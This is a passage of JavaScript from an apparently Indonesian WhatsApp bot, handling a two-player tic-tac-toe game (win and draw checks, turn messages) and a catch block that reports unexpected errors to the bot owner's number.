if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()

if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()

if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()

if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()

if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()

if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()

if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()

if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()

if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳 Result Game Tictactoe 🎲*

*_Permainan Seri 🗿👌_*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

er2 @${tty.er2.split('@')[0]}=⭕
er1 @${tty.er1.split('@')[0]}=❌

${ttt}

Giliran = @${tty.er2.split('@')[0]}`
 nathan.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.er1,tty.er2]}})
}
if (isTTT && iser2){
nuber = parseInt(budy)
if (isNaN(nuber)) return
if (nuber < 1 || nuber > 9) return reply('Masukan Angka Dengan Benar')
main = ky_ttt.filter(hjh => hjh.id.includes(from)) 
if (!tttawal.includes(main[0].angka[nuber])) return reply('Posisi Telah Diisi, Pilih Yang Lain')
if (main[0].gilir.includes(sender)) return reply('Tunggu Giliran')
s = '⭕'
main[0].angka[nuber] = s
main[0].gilir = main[0].er2
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
ky_ttt = naa
pop = main[0]
ky_ttt.push(pop)
tto = ky_ttt.filter(hgh => hgh.id.includes(from))
tty = tto[0]
angka = tto[0].angka
ttt = `${angka[1]}${angka[2]}${angka[3]}\n${angka[4]}${angka[5]}${angka[6]}\n${angka[7]}${angka[8]}${angka[9]}`

ucapmenang = () => {
ucapan1 = `*?? Result Game Tictactoe 🎲*

Yeyyy Permainan Di Menangkan Oleh *@${tty.er2.split('@')[0]}*\n`
ucapan2 = `*🎳 Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
nathan.sendMessage(from, ucapan1, text, {quoted:mek, contextInfo:{mentionedJid: [tty.er2]}})
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}

if (angka[1] == s && angka[2] == s && angka[3] == s) return ucapmenang()
if (angka[1] == s && angka[4] == s && angka[7] == s) return ucapmenang()
if (angka[1] == s && angka[5] == s && angka[9] == s) return ucapmenang()
if (angka[2] == s && angka[5] == s && angka[8] == s) return ucapmenang()
if (angka[4] == s && angka[5] == s && angka[6] == s) return ucapmenang()
if (angka[7] == s && angka[8] == s && angka[9] == s) return ucapmenang()
if (angka[3] == s && angka[5] == s && angka[7] == s) return ucapmenang()
if (angka[3] == s && angka[6] == s && angka[9] == s) return ucapmenang()
if (!ttt.includes('1️⃣') && !ttt.includes('2️⃣') && !ttt.includes('3️⃣') && ! ttt.includes('4️⃣') && !
ttt.includes('5️⃣') && !
ttt.includes('6️⃣') && ! ttt.includes('7️⃣') && ! ttt.includes('8️⃣') && ! ttt.includes('9️⃣')){
ucapan1 = `*🎳Result Game Tictactoe 🎲*

*_Permainan Seri🗿👌*`
ucapan2 = `*🎳 Result Game Tictactoe 🎲*

*Hasil Akhir:*

${ttt}`
reply(ucapan1)
naa = ky_ttt.filter(hhg => !hhg.id.includes(from))
return ky_ttt = naa
}
ucapan = `*🎳 Game Tictactoe 🎲*

er1 @${tty.er1.split('@')[0]}=⭕
er2 @${tty.er2.split('@')[0]}=❌

${ttt}
 
Giliran = @${tty.er1.split('@')[0]}`
 nathan.sendMessage(from, ucapan, text, {quoted: mek, contextInfo:{mentionedJid: [tty.er1,tty.er2]}})
 }
	} catch (e) {
        e = String(e)
            if (!e.includes("this.isZero")) {
            if (!e.includes("Cannot read property 'conversation' of null")) {
            if (!e.includes("Cannot read property 'contextInfo' of undefined")) {
            if (!e.includes("Cannot set property 'mtype' of undefined")) {
            if (!e.includes("jid is not defined")) {
     console.log(color('[ ERROR ]', 'red'), color(e, 'cyan'))
     nathan.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `─────「 *ALERT-ERROR* 」─────\n\n\`\`\`${e}\`\`\`\n\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 999, isForwarded: true, externalAdReply:{title: "Developer Candy BOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./logoku.jpg'),sourceUrl:"https://youtu.be/mw9tozDy8ok"}}})
	}
    }
    }
    }
    }
    }
    }